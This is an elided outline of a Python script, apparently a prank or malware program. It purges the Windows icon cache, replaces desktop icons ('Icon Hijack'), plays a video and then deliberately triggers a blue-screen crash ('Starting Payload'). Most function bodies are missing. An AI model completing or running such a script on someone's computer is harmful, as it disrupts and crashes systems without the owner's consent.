...
def purge_icon_cache():
    ...
    try:
        ...
        for root, dirs, files in os.walk(os.path.join(local_appdata, "Microsoft", "Windows", "Explorer")):
            for f in files:
                if "iconcache" in f:
...
def BSOD():
    """Triggers a clean system crash."""
    print("[INFO] Triggering BSOD...")
...
def play_video_then_bsod(video_path):
    ...
    for frame in clip.iter_frames(fps=clip.fps, dtype="uint8"):
        for event in pygame.event.get(): pass # Prevent 'Not Responding'
...
if __name__ == "__main__":
    ...
    print("[INFO] Phase 1: Icon Hijack...")
    replace_icons(ICON)
    print("[INFO] Phase 2: Starting Payload...")
